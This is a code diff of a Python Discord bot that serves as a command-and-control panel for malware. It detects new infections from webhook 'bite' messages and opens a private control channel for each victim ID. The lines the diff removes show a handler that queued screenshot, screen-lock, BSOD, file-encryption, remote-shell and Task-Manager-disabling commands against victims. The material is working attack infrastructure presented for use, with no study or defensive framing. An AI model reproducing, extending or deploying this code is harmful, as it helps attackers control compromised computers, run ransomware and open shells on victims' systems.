@@ -190,21 +190,21 @@ intents.message_content = True
 intents.guilds = True
 intents.messages = True
 
-bot = discord.Client(intents=intents)  # Simple Client, no commands extension
+bot = discord.Client(intents=intents)
 
 known_victims = set()
 
 async def create_victim_section(victim_id):
     guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("[ERROR] Wrong GUILD_ID")
+        print("[FATAL] Wrong GUILD_ID - bot can't find server")
         return None
     
     category_name = f"Victim-{victim_id}"
     category = discord.utils.get(guild.categories, name=category_name)
     if not category:
         category = await guild.create_category(category_name)
-        print(f"[+] Category created: {category_name}")
+        print(f"[+] Created category: {category_name}")
     
     channel_name = f"logs-{victim_id}"
     channel = discord.utils.get(category.text_channels, name=channel_name)
@@ -214,67 +214,44 @@ async def create_victim_section(victim_id):
             guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
         }
         channel = await category.create_text_channel(channel_name, overwrites=overwrites)
-        print(f"[+] Channel created: {channel_name}")
+        print(f"[+] Created private channel: {channel_name}")
     
     return channel
 
 @bot.event
 async def on_ready():
-    print(f"[+] {bot.user} online - prefix is - (e.g. -ss)")
+    print(f"[+] {bot.user} locked in - watching channel {LOG_CHANNEL_ID} for bites")
 
 @bot.event
 async def on_message(message):
-    if message.author.bot:
-        return
-    
-    print(f"[DEBUG] Message from {message.author} in {message.channel.name} ({message.channel.id}): {message.content}")
+    print(f"[DEBUG] Message in {message.channel.name} ({message.channel.id}) | Webhook: {message.webhook_id is not None} | Bot author: {message.author.bot} | Content: {message.content[:100]}")
 
-    # Bite detection in log channel
+    # Bite detection ONLY in log channel - include webhooks
     if message.channel.id == LOG_CHANNEL_ID:
-        full_text = (message.content + " ".join([embed.title or "" for embed in message.embeds] + [embed.description or "" for embed in message.embeds])).lower()
+        full_text = message.content
+        for embed in message.embeds:
+            if embed.title:
+                full_text += " " + embed.title
+            if embed.description:
+                full_text += " " + embed.description
+        full_text = full_text.lower()
+        
+        print(f"[DEBUG] Full parsed text: {full_text[:500]}...")
+        
         if "we got a bite captain" in full_text:
-            match = re.search(r"\[([a-f0-9]{8})\]", full_text) or re.search(r"victim.*?([a-f0-9]{8})", full_text)
+            # Ironclad regex - catches [abc12345] prefix or any "Victim ID" format
+            match = re.search(r"\[([a-f0-9]{8})\]|victim.*?([a-f0-9]{8})", full_text)
             if match:
-                victim_id = match.group(1)
-                if victim_id not in known_victims:
-                    known_victims.add(victim_id)
-                    print(f"[!] BITE: {victim_id}")
-                    channel = await create_victim_section(victim_id)
-                    if channel:
-                        await message.reply(f"**BITE** - Victim **{victim_id}** hooked\nRoom: {channel.mention}")
+                victim_id = match.group(1) or match.group(2)
+                if victim_id in known_victims:
+                    print(f"[INFO] Already have victim {victim_id}")
+                    return
+                known_victims.add(victim_id)
+                print(f"[!!!] BITE DETECTED - Victim ID: {victim_id}")
+                
+                channel = await create_victim_section(victim_id)
+                if channel:
+                    await message.reply(f"**WE GOT A LIVE ONE** - Victim **{victim_id}** hooked\nControl room spawned: {channel.mention}")
                 return
-
-    # Command handling in victim channels only
-    if message.channel.name.startswith("logs-"):
-        if message.content.startswith("-"):
-            content = message.content[1:].strip().lower()
-            print(f"[COMMAND] Raw: {content} from {message.author}")
-            
-            # Extract victim ID from channel name
-            match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
-            if not match:
-                return
-            victim_id = match.group(1)
-            
-            # Simple command mapping
-            if content == "ss" or content.startswith("screenshot"):
-                cmd = "ss"
-            elif content == "lock":
-                cmd = "lock"
-            elif content == "bsod":
-                cmd = "bsod"
-            elif content.startswith("encrypt"):
-                cmd = "encrypt" + content[7:]  # rest as arg
-            elif content.startswith("shell"):
-                cmd = "shell" + content[5:]
-            elif content == "disabletm":
-                cmd = "disabletm"
-            else:
-                await message.reply("Unknown command. Try -ss, -lock, -bsod, -encrypt [path], -shell cmd")
-                return
-            
-            await message.reply(f"**{cmd}** queued for victim **{victim_id}**")
-            print(f"[QUEUED] {cmd} for {victim_id}")
-            # Add your Pastebin queue code here when ready
 
 bot.run(TOKEN)
